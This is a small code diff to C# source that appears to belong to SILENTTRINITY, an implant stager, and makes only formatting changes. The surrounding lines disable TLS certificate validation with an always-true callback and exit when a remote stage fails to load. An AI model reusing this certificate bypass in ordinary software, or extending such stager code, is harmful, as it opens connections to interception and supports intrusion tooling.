@@ -18,8 +18,8 @@ namespace SILENTTRINITY
                                  (sender, cert, chain, sslPolicyErrors) => true;
             ServicePointManager.SecurityProtocol = (SecurityProtocolType)768 |
                                                    (SecurityProtocolType)3072;
-
             ServicePointManager.Expect100Continue = false;
+
             AppDomain.CurrentDomain.AssemblyResolve += ResolveEventHandler;
         }
 
@@ -48,7 +48,7 @@ namespace SILENTTRINITY
             catch
             {
 #if DEBUG
-                Console.WriteLine("\n\t[!] ERROR: Unable to get the stage.");
+                Console.WriteLine("\n\n[!] ERROR: Unable to get the stage.");
 #endif
                 Environment.Exit(-1);
             }
